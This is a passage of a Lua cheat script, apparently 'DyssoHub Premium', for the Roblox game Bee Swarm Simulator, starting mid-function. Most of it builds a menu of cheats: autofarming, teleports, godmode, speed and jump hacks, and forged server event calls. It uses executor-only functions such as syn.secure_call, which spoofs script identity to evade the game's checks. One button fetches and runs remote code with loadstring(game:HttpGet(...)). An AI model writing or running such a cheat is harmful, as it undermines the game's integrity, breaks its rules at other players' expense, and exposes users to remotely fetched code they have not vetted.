        
        for i,v in pairs(conv) do
            if canToyBeUsed(v) == true then
                lastWithoutCooldown = v
            end
        end
        local converted=false
        if lastWithoutCooldown ~= nil and string.find(kocmoc.vars.autouseMode,"Ticket") or string.find(kocmoc.vars.autouseMode,"All") then
            if converted == false then
            game:GetService("ReplicatedStorage").Events.ToyEvent:FireServer(lastWithoutCooldown)
            converted=true
            end
        end
        if GetItemListWithValue()["Snowflake"] > 0 and string.find(kocmoc.vars.autouseMode,"Snowflak") or string.find(kocmoc.vars.autouseMode,"All") then
            game:GetService("ReplicatedStorage").Events.PlayerActivesCommand:FireServer({["Name"] = "Snowflake"})
        end
            if GetItemListWithValue()["Coconut"] > 0 and string.find(kocmoc.vars.autouseMode,"Coconut") or string.find(kocmoc.vars.autouseMode,"All") then
            game:GetService("ReplicatedStorage").Events.PlayerActivesCommand:FireServer({["Name"] = "Coconut"})
            end
                    if GetItemListWithValue()["Stinger"] > 0 and string.find(kocmoc.vars.autouseMode,"Stinger") or string.find(kocmoc.vars.autouseMode,"All") then
            game:GetService("ReplicatedStorage").Events.PlayerActivesCommand:FireServer({["Name"] = "Stinger"})
            end
    end
    
    local function fetchBuffTable(stats)
        local stTab = {}
        if game:GetService("Players").LocalPlayer then
            if game:GetService("Players").LocalPlayer.PlayerGui then
                if game:GetService("Players").LocalPlayer.PlayerGui.ScreenGui then
                    for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.ScreenGui:GetChildren()) do
                        if v.Name == "TileGrid" then
                            for p,l in pairs(v:GetChildren()) do
                                if l:FindFirstChild("BG") then
                                    if l:FindFirstChild("BG"):FindFirstChild("Icon") then
                                        local ic = l:FindFirstChild("BG"):FindFirstChild("Icon")
                                        for field,fdata in pairs(stats) do
                                            if fdata["DecalID"]~= nil then
                                                if string.find(ic.Image,fdata["DecalID"]) then
                                                    if ic.Parent:FindFirstChild("Text") then
                                                        if ic.Parent:FindFirstChild("Text").Text == "" then
                                                            stTab[field]=1
                                                        else
                                                            local thing = ""
                                                            thing = string.gsub(ic.Parent:FindFirstChild("Text").Text,"x","")
                                                            stTab[field]=tonumber( thing + 1 )
                                                        end
                                                    end
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
        
        return stTab
    end
    
    local Config = { WindowName = "DyssoHub Premium", Color = Color3.fromRGB(164, 84, 255), Keybind = Enum.KeyCode.Semicolon}
    local Window = library:CreateWindow(Config, game:GetService("CoreGui"))
    
    local hometab = Window:CreateTab("Home")
    local farmtab = Window:CreateTab("Farming")
    local combtab = Window:CreateTab("Combat")
    local itemstab = Window:CreateTab("Items")
    local misctab = Window:CreateTab("Misc")
    local setttab = Window:CreateTab("Settings")
    
    local loadingInfo = hometab:CreateSection("Startup")
    local loadingFunctions = loadingInfo:CreateLabel("Loading Functions..")
    wait(1)
    loadingFunctions:UpdateText("Loaded Functions")
    local loadingBackend = loadingInfo:CreateLabel("Loading Backend..")
    
    --temporary sh patch
    local s = ""
    for l = 1,50 do
    if string.find(tostring(l),"0") then
    s = s .. tostring(game.Players.LocalPlayer.UserId) .. "\n"
    else
    s = s .. tostring(game.Players.LocalPlayer.UserId)
    end
    end
    writefile("PrevServers2.txt",s)
    --end temp patch
    
    --loadstring(game:HttpGet("https://raw.githubusercontent.com/Boxking776/kocmoc/main/functions/premium/loadperks.lua"))()("WindowLoad",Window)
    
    
    
    --loadPremium("WindowLoad",Window)
    
    loadingBackend:UpdateText("Loaded Backend")
    local loadingUI = loadingInfo:CreateLabel("Loading UI..")
    
    local information = hometab:CreateSection("Information")
    information:CreateLabel("Welcome, "..api.nickname.."!")
    information:CreateLabel("Script version: "..temptable.version)
    information:CreateLabel("Place version: "..game.PlaceVersion)
    information:CreateLabel("Place version: "..game.PlaceVersion)
    information:CreateLabel("Script by okan, fallen")
    local gainedhoneylabel = information:CreateLabel("Gained Honey: 0")
    information:CreateButton("Discord Invite", function() setclipboard("https://discord.gg/xUA7GMynb9") end)
    information:CreateToggle("Status Panel",true,function(bool) 
    kocmoc.toggles.enablestatuspanel=bool 
    if bool == false then 
    for i,v in pairs(game:GetService("CoreGui"):GetDescendants()) do 
    if string.find(v.Name,"Mob Panel") or string.find(v.Name,"Utility Panel") then 
    v.Visible = false end end
    else for i,v in pairs(game:GetService("CoreGui"):GetDescendants()) do if string.find(v.Name,"Mob Panel") or string.find(v.Name,"Utility Panel") then v.Visible = true end end end end)
    local farmo = farmtab:CreateSection("Farming")
    local fielddropdown = farmo:CreateDropdown("Field", fieldstable, function(String) kocmoc.vars.field = String end) fielddropdown:SetOption(fieldstable[1])
    convertatslider = farmo:CreateSlider("Convert At", 0, 100, 100, false, function(Value) kocmoc.vars.convertat = Value end)
    local autofarmtoggle = farmo:CreateToggle("Autofarm [⚙]", nil, function(State) kocmoc.toggles.autofarm = State end) autofarmtoggle:CreateKeybind("U",function(Key) end)
    farmo:CreateToggle("Autodig", nil, function(State) kocmoc.toggles.autodig = State end)
    farmo:CreateDropdown("Autodig Mode", {"Normal","Collector Steal"}, function(Option)  kocmoc.vars.autodigmode = Option end)
    
    local contt = farmtab:CreateSection("Container Tools")
    contt:CreateToggle("Don't Convert Pollen", nil, function(State) kocmoc.toggles.disableconversion = State end)
    contt:CreateToggle("Auto Bag Reduction",nil,function(Boole) kocmoc.toggles.autouseconvertors = Boole end)
    contt:CreateDropdown("Bag Reduction Mode",{"Ticket Converters","Just Snowflakes","Just Coconuts","Stingers","Snowflakes and Coconuts","Tickets and Snowflakes","Tickets and Coconuts","All"},function(Select) kocmoc.vars.autouseMode = Select end)
    contt:CreateSlider("Reduction Confirmation Time",3,20,10,false,function(tttttttt) kocmoc.vars.autoconvertWaitTime = tonumber(tttttttt) end)
    
    farmo:CreateToggle("Auto Sprinkler", nil, function(State) kocmoc.toggles.autosprinkler = State end)
    farmo:CreateToggle("Farm Bubbles", nil, function(State) kocmoc.toggles.farmbubbles = State end)
    farmo:CreateToggle("Farm Flames", nil, function(State) kocmoc.toggles.farmflame = State end)
    farmo:CreateToggle("Farm Coconuts & Shower", nil, function(State) kocmoc.toggles.farmcoco = State end)
    farmo:CreateToggle("Farm Precise Crosshairs", nil, function(State) kocmoc.toggles.collectcrosshairs = State end)
    farmo:CreateToggle("Farm Fuzzy Bombs", nil, function(State) kocmoc.toggles.farmfuzzy = State end)
    farmo:CreateToggle("Farm Under Balloons", nil, function(State) kocmoc.toggles.farmunderballoons = State end)
    farmo:CreateToggle("Farm Under Clouds", nil, function(State) kocmoc.toggles.farmclouds = State end)
    farmo:CreateToggle("Farm Duped Tokens", nil, function(State) kocmoc.toggles.farmduped = State end)
    farmo:CreateLabel("")
    farmo:CreateToggle("Auto Honey Mask",nil,function(bool)
        kocmoc.toggles.honeymaskconv = bool
    end)
    farmo:CreateDropdown("Default Mask",MasksTable,function(val)
        kocmoc.vars.defmask = val
    end)
    --farmo:CreateToggle("Farm Closest Leaves", nil, function(State) kocmoc.toggles.farmclosestleaf = State end)
    
    local farmt = farmtab:CreateSection("Farming")
    farmt:CreateToggle("Auto Dispenser [⚙]", nil, function(State) kocmoc.toggles.autodispense = State end)
    farmt:CreateToggle("Auto Field Boosters [⚙]", nil, function(State) kocmoc.toggles.autoboosters = State end)
    farmt:CreateToggle("Auto Wealth Clock", nil, function(State) kocmoc.toggles.clock = State end)
    farmt:CreateToggle("Auto Gingerbread Bears [B]", nil, function(State) kocmoc.toggles.collectgingerbreads = State end)
    farmt:CreateToggle("Auto Samovar [B]", nil, function(State) kocmoc.toggles.autosamovar = State end)
    farmt:CreateToggle("Auto Snow Machine [B]", nil, function(State) kocmoc.toggles.autosnowmachines = State end)
    farmt:CreateToggle("Auto Stockings [B]", nil, function(State) kocmoc.toggles.autostockings = State end)
    farmt:CreateToggle("Auto Honey Wreath [B]", nil, function(State) kocmoc.toggles.autowreath = State end)
    farmt:CreateToggle("Auto Planters", nil, function(State) kocmoc.toggles.autoplanters = State end):AddToolTip("Will re-plant your planters after converting, if they hit 100%")
    farmt:CreateToggle("Auto Honey Candles [B]", nil, function(State) kocmoc.toggles.autocandles = State end)
    farmt:CreateToggle("Auto Beesmas Feast [B]", nil, function(State) kocmoc.toggles.autofeast = State end)
    farmt:CreateToggle("Auto Onett's Lid Art [B]", nil, function(State) kocmoc.toggles.autoonettart = State end)
    farmt:CreateToggle("Auto Free Antpasses", nil, function(State) kocmoc.toggles.freeantpass = State end)
    farmt:CreateToggle("Farm Sprouts", nil, function(State) kocmoc.toggles.farmsprouts = State end)
    farmt:CreateToggle("Farm Puffshrooms", nil, function(State) kocmoc.toggles.farmpuffshrooms = State end)
    farmt:CreateToggle("Farm Snowflakes [🛡️] [B]", nil, function(State) kocmoc.toggles.farmsnowflakes = State end)
    farmt:CreateToggle("Teleport To Rares [⚠️]", nil, function(State) kocmoc.toggles.farmrares = State end)
    farmt:CreateToggle("Auto Accept/Confirm Quests [⚙]", nil, function(State) kocmoc.toggles.autoquest = State end)
    farmt:CreateToggle("Auto Do Quests [⚙]", nil, function(State) kocmoc.toggles.autodoquest = State end)
    farmt:CreateToggle("Auto Honeystorm", nil, function(State) kocmoc.toggles.honeystorm = State end)
    farmt:CreateLabel(" ")
    farmt:CreateToggle("Reset Bee Energy after X Conversions",nil,function(bool) kocmoc.vars.resetbeeenergy = bool end)
    farmt:CreateTextBox("Conversion Amount", "default = 3", true, function(Value) kocmoc.vars.resettimer = tonumber(Value) end)
    
    local mobkill = combtab:CreateSection("Combat")
    mobkill:CreateToggle("Train Crab", nil, function(State) if State then api.humanoidrootpart().CFrame = CFrame.new(-307.52117919922, 107.91863250732, 467.86791992188) end end)
    mobkill:CreateToggle("Train Snail", nil, function(State) fd = game.Workspace.FlowerZones['Stump Field'] if State then api.humanoidrootpart().CFrame = CFrame.new(fd.Position.X, fd.Position.Y-6, fd.Position.Z) else api.humanoidrootpart().CFrame = CFrame.new(fd.Position.X, fd.Position.Y+2, fd.Position.Z) end end)
    mobkill:CreateToggle("Kill Mondo", nil, function(State) kocmoc.toggles.killmondo = State end)
    mobkill:CreateToggle("Kill Vicious", nil, function(State) kocmoc.toggles.killvicious = State end)
    mobkill:CreateToggle("Kill Windy", nil, function(State) kocmoc.toggles.killwindy = State end)
    mobkill:CreateToggle("Auto Kill Mobs", nil, function(State) kocmoc.toggles.autokillmobs = State end):AddToolTip("Kills mobs after x pollen converting")
    mobkill:CreateToggle("Avoid Mobs", nil, function(State) kocmoc.toggles.avoidmobs = State end)
    mobkill:CreateToggle("Auto Ant", nil, function(State) kocmoc.toggles.autoant = State end):AddToolTip("You Need Spark Stuff 😋; Goes to Ant Challenge after pollen converting")
    
    local serverhopkill = combtab:CreateSection("Serverhopping Combat")
    serverhopkill:CreateButton("Vicious Bee Serverhopper [⚠️][📜]",function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Boxking776/kocmoc/main/functions/viciousbeeserverhop.lua"))() end):AddToolTip("Serverhops for rouge vicious bees")
    serverhopkill:CreateLabel("")
    serverhopkill:CreateLabel("[⚠️] These functions will unload the UI")
    serverhopkill:CreateLabel("")
    
    local amks = combtab:CreateSection("Auto Kill Mobs Settings")
    amks:CreateTextBox('Kill Mobs After x Convertions', 'default = 3', true, function(Value) kocmoc.vars.monstertimer = tonumber(Value) end)
    
    
    local wayp = misctab:CreateSection("Waypoints")
    wayp:CreateDropdown("Field Teleports", fieldstable, function(Option) game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Workspace").FlowerZones:FindFirstChild(Option).CFrame end)
    wayp:CreateDropdown("Monster Teleports", spawnerstable, function(Option) d = game:GetService("Workspace").MonsterSpawners:FindFirstChild(Option) game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(d.Position.X, d.Position.Y+3, d.Position.Z) end)
    wayp:CreateDropdown("Toys Teleports", toystable, function(Option) d = game:GetService("Workspace").Toys:FindFirstChild(Option).Platform game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(d.Position.X, d.Position.Y+3, d.Position.Z) end)
    wayp:CreateButton("Teleport to hive", function() game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players").LocalPlayer.SpawnPos.Value end)
    
    local useitems = itemstab:CreateSection("Use Items")
    
    useitems:CreateButton("Use All Buffs [⚠️]",function() for i,v in pairs(buffTable) do  game:GetService("ReplicatedStorage").Events.PlayerActivesCommand:FireServer({["Name"]=i}) end end)
    useitems:CreateLabel("")
    
    for i,v in pairs(buffTable) do 
    useitems:CreateButton("Use "..i,function() game:GetService("ReplicatedStorage").Events.PlayerActivesCommand:FireServer({["Name"]=i}) end) 
    useitems:CreateToggle("Auto Use "..i,nil,function(bool)
        buffTable[i].b = bool
    end)
    end
    
    
    local miscc = misctab:CreateSection("Misc")
    miscc:CreateButton("Ant Challenge Semi-Godmode", function() api.tween(1, CFrame.new(93.4228, 32.3983, 553.128)) task.wait(1) game.ReplicatedStorage.Events.ToyEvent:FireServer("Ant Challenge") game.Players.LocalPlayer.Character.HumanoidRootPart.Position = Vector3.new(93.4228, 42.3983, 553.128) task.wait(2) game.Players.LocalPlayer.Character.Humanoid.Name = 1 local l = game.Players.LocalPlayer.Character["1"]:Clone() l.Parent = game.Players.LocalPlayer.Character l.Name = "Humanoid" task.wait() game.Players.LocalPlayer.Character["1"]:Destroy() api.tween(1, CFrame.new(93.4228, 32.3983, 553.128)) task.wait(8) api.tween(1, CFrame.new(93.4228, 32.3983, 553.128)) end)
    local wstoggle = miscc:CreateToggle("Walk Speed", nil, function(State) kocmoc.toggles.loopspeed = State end) wstoggle:CreateKeybind("K", function(Key) end)
    local jptoggle = miscc:CreateToggle("Jump Power", nil, function(State) kocmoc.toggles.loopjump = State end) jptoggle:CreateKeybind("L", function(Key) end)
    miscc:CreateToggle("Godmode", nil, function(State) kocmoc.toggles.godmode = State if State then bssapi:Godmode(true) else bssapi:Godmode(false) end end)
    local misco = misctab:CreateSection("Other")
    misco:CreateDropdown("Equip Accesories", accesoriestable, function(Option) local ohString1 = "Equip" local ohTable2 = { ["Mute"] = false, ["Type"] = Option, ["Category"] = "Accessory" } game:GetService("ReplicatedStorage").Events.ItemPackageEvent:InvokeServer(ohString1, ohTable2) end)
    misco:CreateDropdown("Equip Masks", masktable, function(Option) local ohString1 = "Equip" local ohTable2 = { ["Mute"] = false, ["Type"] = Option, ["Category"] = "Accessory" } game:GetService("ReplicatedStorage").Events.ItemPackageEvent:InvokeServer(ohString1, ohTable2) end)
    misco:CreateDropdown("Equip Collectors", collectorstable, function(Option) local ohString1 = "Equip" local ohTable2 = { ["Mute"] = false, ["Type"] = Option, ["Category"] = "Collector" } game:GetService("ReplicatedStorage").Events.ItemPackageEvent:InvokeServer(ohString1, ohTable2) end)
    misco:CreateDropdown("Generate Amulet", {"Supreme Star Amulet", "Diamond Star Amulet", "Gold Star Amulet","Silver Star Amulet","Bronze Star Amulet","Moon Amulet"}, function(Option) local A_1 = Option.." Generator" local Event = game:GetService("ReplicatedStorage").Events.ToyEvent Event:FireServer(A_1) end)
    misco:CreateButton("Export Stats Table [📜]", function() local StatCache = require(game.ReplicatedStorage.ClientStatCache)writefile("Stats_"..api.nickname..".json", StatCache:Encode()) end)
    
    if string.find(string.upper(identifyexecutor()),"SYN") or string.find(string.upper(identifyexecutor()),"SCRIP") then
    local visu = misctab:CreateSection("Visual")
    local alertText = "☢️ A nuke is incoming! ☢️"
    local alertDesign = "Purple"
    local function pushAlert()
        local alerts = require(game:GetService("ReplicatedStorage").AlertBoxes)
        local chat = function(...)
            alerts:Push(...)
        end
        chat(alertText,nil,alertDesign)
    end
    visu:CreateButton("Spawn Coconut",function()
        syn.secure_call(function() 
            require(game.ReplicatedStorage.LocalFX.FallingCoconut)({
            Pos = game.Players.LocalPlayer.Character.Humanoid.RootPart.CFrame.p,
            Dur = 0.6,
            Radius = 16,
            Delay = 1.5,
            Friendly = true
        })
    end, game.Players.LocalPlayer.PlayerScripts.ClientInit)
    end)
    visu:CreateButton("Spawn Hostile Coconut",function()
        syn.secure_call(function() 
            require(game.ReplicatedStorage.LocalFX.FallingCoconut)({
            Pos = game.Players.LocalPlayer.Character.Humanoid.RootPart.CFrame.p,
            Dur = 0.6,
            Radius = 16,
            Delay = 1.5,
            Friendly = false
        })
    end, game.Players.LocalPlayer.PlayerScripts.ClientInit)
    end)
    visu:CreateButton("Spawn Mythic Meteor",function()
        syn.secure_call(function() 
            require(game.ReplicatedStorage.LocalFX.MythicMeteor)({
            Pos = game.Players.LocalPlayer.Character.Humanoid.RootPart.CFrame.p,
            Dur = 0.6,
            Radius = 16,
            Delay = 1.5,
            Friendly = true
        })
    end, game.Players.LocalPlayer.PlayerScripts.ClientInit)
    end)
    visu:CreateButton("Spawn Jelly Bean",function()
    local jellybeans = {"Navy","Blue","Spoiled","Merigold","Teal","Periwinkle","Pink","Slate","White","Black","Green","Brown","Yellow","Maroon","Red"}
    syn.secure_call(function() 
            require(game.ReplicatedStorage.LocalFX.JellyBeanToss)({
            Start = game.Players.LocalPlayer.Character.Humanoid.RootPart.CFrame.p,
            Type = jellybeans[math.random(1,#jellybeans)],
            End = (game.Players.LocalPlayer.Character.Humanoid.RootPart.CFrame * CFrame.new(0,0,-35)).p + Vector3.new(math.random(1,20),0,math.random(1,20))
        })
    end, game.Players.LocalPlayer.PlayerScripts.ClientInit)
    end)
    visu:CreateButton("Spawn Puffshroom Spores",function()
    task.spawn(function() syn.secure_call(function()
    local field = game:GetService("Workspace").FlowerZones:GetChildren()[math.random(1,#game:GetService("Workspace").FlowerZones:GetChildren())]
    local pos = field.CFrame.p
    require(game.ReplicatedStorage.LocalFX.PuffshroomSporeThrow)({
          Start = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.p,
          End = pos,
    })
    end, game.Players.LocalPlayer.PlayerScripts.ClientInit) 
    wait(10)
    workspace.Particles:FindFirstChild("SporeCloud"):Destroy()
    end)
    end)
    visu:CreateButton("Spawn Party Popper",function()
    syn.secure_call(function() 
    require(game:GetService("ReplicatedStorage").LocalFX.PartyPopper)({
    Pos = game.Players.LocalPlayer.Character.Humanoid.RootPart.CFrame.p,
    })
    end, game.Players.LocalPlayer.PlayerScripts.ClientInit)
    end)
    visu:CreateButton("Spawn Flame",function()
    syn.secure_call(function()
            require(game.ReplicatedStorage.LocalFX.LocalFlames).AddFlame(
            game.Players.LocalPlayer.Character.Humanoid.RootPart.CFrame.p,
            10,
            1,
            game.Players.LocalPlayer.UserId,
            false
        )
    end, game.Players.LocalPlayer.PlayerScripts.ClientInit)
    end)
    visu:CreateButton("Spawn Dark Flame",function()
    syn.secure_call(function()
            require(game.ReplicatedStorage.LocalFX.LocalFlames).AddFlame(
            game.Players.LocalPlayer.Character.Humanoid.RootPart.CFrame.p,
            10,
            1,
            game.Players.LocalPlayer.UserId,
            true
        )
    end, game.Players.LocalPlayer.PlayerScripts.ClientInit)
    end)
    local booolholder = false
    visu:CreateToggle("Flame Walk",nil,function(boool)
        if boool == true then
            booolholder = true
            repeat wait(0.1)
                syn.secure_call(function()
                    require(game.ReplicatedStorage.LocalFX.LocalFlames).AddFlame(
                    game.Players.LocalPlayer.Character.Humanoid.RootPart.CFrame.p,
                    10,
                    1,
                    game.Players.LocalPlayer.UserId,
                    false
                )
            end, game.Players.LocalPlayer.PlayerScripts.ClientInit)
            until booolholder == false
        else
            booolholder = false
        end
    end)
    visu:CreateToggle("Dark Flame Walk",nil,function(boool)
        if boool == true then
            booolholder = true
            repeat wait(0.1)
                syn.secure_call(function()
                    require(game.ReplicatedStorage.LocalFX.LocalFlames).AddFlame(
                    game.Players.LocalPlayer.Character.Humanoid.RootPart.CFrame.p,
                    10,
                    1,
                    game.Players.LocalPlayer.UserId,
                    true
                )
            end, game.Players.LocalPlayer.PlayerScripts.ClientInit)
            until booolholder == false
        else
            booolholder = false
        end
    end)
    visu:CreateLabel("")
    local styles = {}
    local raw = {
        Blue = Color3.fromRGB(50, 131, 255), 
        ChaChing = Color3.fromRGB(50, 131, 255), 
        Green = Color3.fromRGB(27, 119, 43), 
        Red = Color3.fromRGB(201, 39, 28), 
        White = Color3.fromRGB(140, 140, 140), 
        Yellow = Color3.fromRGB(218, 216, 31), 
        Gold = Color3.fromRGB(254, 200, 9), 
        Pink = Color3.fromRGB(242, 129, 255), 
        Teal = Color3.fromRGB(33, 255, 171), 
        Purple = Color3.fromRGB(125, 97, 232), 
        TaDah = Color3.fromRGB(254, 200, 9), 
        Festive = Color3.fromRGB(197, 0, 15), 
        Festive2 = Color3.fromRGB(197, 0, 15), 
        Badge = Color3.fromRGB(254, 200, 9), 
        Robo = Color3.fromRGB(34, 255, 64), 
        EggHunt = Color3.fromRGB(236, 227, 158), 
        Vicious = Color3.fromRGB(0, 1, 5), 
        Brown = Color3.fromRGB(82, 51, 43)
    }
    local alertDesign2 = "ChaChing"
    for i,v in pairs(raw) do table.insert(styles,i) end
    visu:CreateDropdown("Notification Style",styles,function(dd) 
        alertDesign2=dd
    end)
    visu:CreateTextBox("Text","ex. Hello World",false,function(tx)
        alertText = tx
        alertDesign = alertDesign2
        syn.secure_call(pushAlert, game:GetService("Players").LocalPlayer.PlayerScripts.AlertBoxes)
    end)
    
    visu:CreateLabel("")
    local destroym = true
    visu:CreateToggle("Destroy Map", true, function(State) destroym = State end)
    local nukeDuration = 10
    local nukePosition = Vector3.new(-26.202560424804688, 0.657240390777588, 172.31759643554688)
    local spoof = game:GetService("Players").LocalPlayer.PlayerScripts.AlertBoxes
    function Nuke()
        require(game.ReplicatedStorage.LocalFX.MythicMeteor)({
            Pos = nukePosition,
            Dur = nukeDuration,
            Radius = 50,
            Delay = 1
        })
    end
    function DustCloud()
        require(game.ReplicatedStorage.LocalFX.OrbExplode)({
            Color = Color3.new(0.313726, 0.313726, 0.941176);
            Radius = 600;
            Dur = 15;
            Pos = nukePosition;
        })
    end
    visu:CreateButton("Spawn Nuke",function() 
     alertText = "☢️ A nuke is incoming! ☢️"
    syn.secure_call(pushAlert, spoof)
    alertText = "☢️ Get somewhere high! ☢️"
    wait(1.5)
    task.spawn(function()
    local Humanoid = game.Players.LocalPlayer.Character.Humanoid
    for i = 1, 950 do
        local x = math.random(-100,100)/100
        local y = math.random(-100,100)/100
        local z = math.random(-100,100)/100
        Humanoid.CameraOffset = Vector3.new(x,y,z)
        wait(0.01)
    end
    end)
    syn.secure_call(pushAlert, spoof)
    wait(10)
    spawn(function() syn.secure_call(Nuke, game.Players.LocalPlayer.PlayerScripts.ClientInit) end)
    wait(nukeDuration)
    spawn(function() syn.secure_call(DustCloud, game.Players.LocalPlayer.PlayerScripts.ClientInit) end)
    wait(1)
    local Orb = game:GetService("Workspace").Particles:FindFirstChild("Orb")
    if Orb then Orb.CanCollide = true end
    if destroym == true then
    repeat wait(3)
    for i,v in pairs(Orb:GetTouchingParts()) do
      if v.Anchored == true then v.Anchored = false end 
      v:BreakJoints()
      v.Position = v.Position + Vector3.new(0,0,2)
    end
    until Orb == nil end
    end)
    end
    
    local autofeed = itemstab:CreateSection("Auto Feed")
    
    local function feedAllBees(treat,amt)
        for L = 1,5 do
            for U = 1,10 do
                game:GetService("ReplicatedStorage").Events.ConstructHiveCellFromEgg:InvokeServer(L, U, treat, amt)
            end
        end
    end
    
    autofeed:CreateDropdown("Select Treat",treatsTable,function(option) kocmoc.vars.selectedTreat = option end)
    autofeed:CreateTextBox("Treat Amount","10",false,function(Value) kocmoc.vars.selectedTreatAmount = tonumber(Value) end)
    autofeed:CreateButton("Feed All Bees",function() feedAllBees(kocmoc.vars.selectedTreat,kocmoc.vars.selectedTreatAmount) end)
    
    local windShrine = itemstab:CreateSection("Wind Shrine")
    windShrine:CreateDropdown("Select Item", donatableItemsTable, function(Option)  kocmoc.vars.donoItem = Option end)
    windShrine:CreateTextBox("Item Quantity","10",false,function(Value) kocmoc.vars.donoAmount = tonumber(Value) end)
    windShrine:CreateButton("Donate",function()
        donateToShrine(kocmoc.vars.donoItem,kocmoc.vars.donoAmount)
        print(kocmoc.vars.donoAmount)
    end)
    windShrine:CreateToggle("Auto Donate",nil,function(selection)
        kocmoc.toggles.autodonate = selection
    end)
    
    
    local farmsettings = setttab:CreateSection("Autofarm Settings")
    farmsettings:CreateTextBox("Autofarming Walkspeed", "Default Value = 60", true, function(Value) kocmoc.vars.farmspeed = Value end)
    farmsettings:CreateToggle("^ Loop Speed On Autofarming",nil, function(State) kocmoc.toggles.loopfarmspeed = State end)
    farmsettings:CreateToggle("Don't Walk In Field",nil, function(State) kocmoc.toggles.farmflower = State end)
    farmsettings:CreateToggle("Convert Hive Balloon",nil, function(State) kocmoc.toggles.convertballoons = State end)
    farmsettings:CreateToggle("Don't Farm Tokens",nil, function(State) kocmoc.toggles.donotfarmtokens = State end)
    farmsettings:CreateToggle("Enable Token Blacklisting",nil, function(State) kocmoc.toggles.enabletokenblacklisting = State end)
    farmsettings:CreateSlider("Walk Speed", 0, 120, 70, false, function(Value) kocmoc.vars.walkspeed = Value end)
    farmsettings:CreateSlider("Jump Power", 0, 120, 70, false, function(Value) kocmoc.vars.jumppower = Value end)
    local raresettings = setttab:CreateSection("Tokens Settings")
    raresettings:CreateTextBox("Asset ID", 'rbxassetid', false, function(Value) rarename = Value end)
    raresettings:CreateButton("Add Token To Rares List", function()
        table.insert(kocmoc.rares, rarename)
        game:GetService("CoreGui"):FindFirstChild(_G.windowname).Main:FindFirstChild("Rares List D",true):Destroy()
        raresettings:CreateDropdown("Rares List", kocmoc.rares, function(Option) end)
    end)
    raresettings:CreateButton("Remove Token From Rares List", function()
        table.remove(kocmoc.rares, api.tablefind(kocmoc.rares, rarename))
        game:GetService("CoreGui"):FindFirstChild(_G.windowname).Main:FindFirstChild("Rares List D",true):Destroy()
        raresettings:CreateDropdown("Rares List", kocmoc.rares, function(Option) end)
    end)
    raresettings:CreateButton("Add Token To Blacklist", function()
        table.insert(kocmoc.bltokens, rarename)
        game:GetService("CoreGui"):FindFirstChild(_G.windowname).Main:FindFirstChild("Tokens Blacklist D",true):Destroy()
        raresettings:CreateDropdown("Tokens Blacklist", kocmoc.bltokens, function(Option) end)
    end)
    raresettings:CreateButton("Remove Token From Blacklist", function()
        table.remove(kocmoc.bltokens, api.tablefind(kocmoc.bltokens, rarename))
        game:GetService("CoreGui"):FindFirstChild(_G.windowname).Main:FindFirstChild("Tokens Blacklist D",true):Destroy()
        raresettings:CreateDropdown("Tokens Blacklist", kocmoc.bltokens, function(Option) end)
    end)
    raresettings:CreateDropdown("Tokens Blacklist", kocmoc.bltokens, function(Option) end)
    raresettings:CreateDropdown("Rares List", kocmoc.rares, function(Option) end)
    local dispsettings = setttab:CreateSection("Auto Dispenser & Auto Boosters Settings")
    dispsettings:CreateToggle("Royal Jelly Dispenser", nil, function(State) kocmoc.dispensesettings.rj = not kocmoc.dispensesettings.rj end)
    dispsettings:CreateToggle("Blueberry Dispenser", nil,  function(State) kocmoc.dispensesettings.blub = not kocmoc.dispensesettings.blub end)
    dispsettings:CreateToggle("Strawberry Dispenser", nil,  function(State) kocmoc.dispensesettings.straw = not kocmoc.dispensesettings.straw end)
    dispsettings:CreateToggle("Treat Dispenser", nil,  function(State) kocmoc.dispensesettings.treat = not kocmoc.dispensesettings.treat end)
    dispsettings:CreateToggle("Coconut Dispenser", nil,  function(State) kocmoc.dispensesettings.coconut = not kocmoc.dispensesettings.coconut end)
    dispsettings:CreateToggle("Glue Dispenser", nil,  function(State) kocmoc.dispensesettings.glue = not kocmoc.dispensesettings.glue end)
    dispsettings:CreateToggle("Mountain Top Booster", nil,  function(State) kocmoc.dispensesettings.white = not kocmoc.dispensesettings.white end)
    dispsettings:CreateToggle("Blue Field Booster", nil,  function(State) kocmoc.dispensesettings.blue = not kocmoc.dispensesettings.blue end)
    dispsettings:CreateToggle("Red Field Booster", nil,  function(State) kocmoc.dispensesettings.red = not kocmoc.dispensesettings.red end)
    local guisettings = setttab:CreateSection("GUI Settings")
    local uitoggle = guisettings:CreateToggle("UI Toggle", nil, function(State) Window:Toggle(State) end) uitoggle:CreateKeybind(tostring(Config.Keybind):gsub("Enum.KeyCode.", ""), function(Key) Config.Keybind = Enum.KeyCode[Key] end) uitoggle:SetState(true)
    guisettings:CreateColorpicker("UI Color", function(Color) Window:ChangeColor(Color) end)
    local themes = guisettings:CreateDropdown("Image", {"Default","Hearts","Abstract","Hexagon","Circles","Lace With Flowers","Floral"}, function(Name) if Name == "Default" then Window:SetBackground("2151741365") elseif Name == "Hearts" then Window:SetBackground("6073763717") elseif Name == "Abstract" then Window:SetBackground("6073743871") elseif Name == "Hexagon" then Window:SetBackground("6073628839") elseif Name == "Circles" then Window:SetBackground("6071579801") elseif Name == "Lace With Flowers" then Window:SetBackground("6071575925") elseif Name == "Floral" then Window:SetBackground("5553946656") end end)themes:SetOption("Default")
    local kocmocs = setttab:CreateSection("Configs")
    kocmocs:CreateTextBox("Config Name", 'ex: stumpconfig', false, function(Value) temptable.configname = Value end)
    kocmocs:CreateButton("Load Config", function() kocmoc = game:service'HttpService':JSONDecode(readfile("kocmoc/BSS_"..temptable.configname..".json")) end)
    kocmocs:CreateButton("Save Config", function() writefile("kocmoc/BSS_"..temptable.configname..".json",game:service'HttpService':JSONEncode(kocmoc)) end)
    kocmocs:CreateButton("Reset Config", function() kocmoc = defaultkocmoc end)
    local fieldsettings = setttab:CreateSection("Fields Settings")
    fieldsettings:CreateDropdown("Best White Field", temptable.whitefields, function(Option) kocmoc.bestfields.white = Option end)
    fieldsettings:CreateDropdown("Best Red Field", temptable.redfields, function(Option) kocmoc.bestfields.red = Option end)
    fieldsettings:CreateDropdown("Best Blue Field", temptable.bluefields, function(Option) kocmoc.bestfields.blue = Option end)
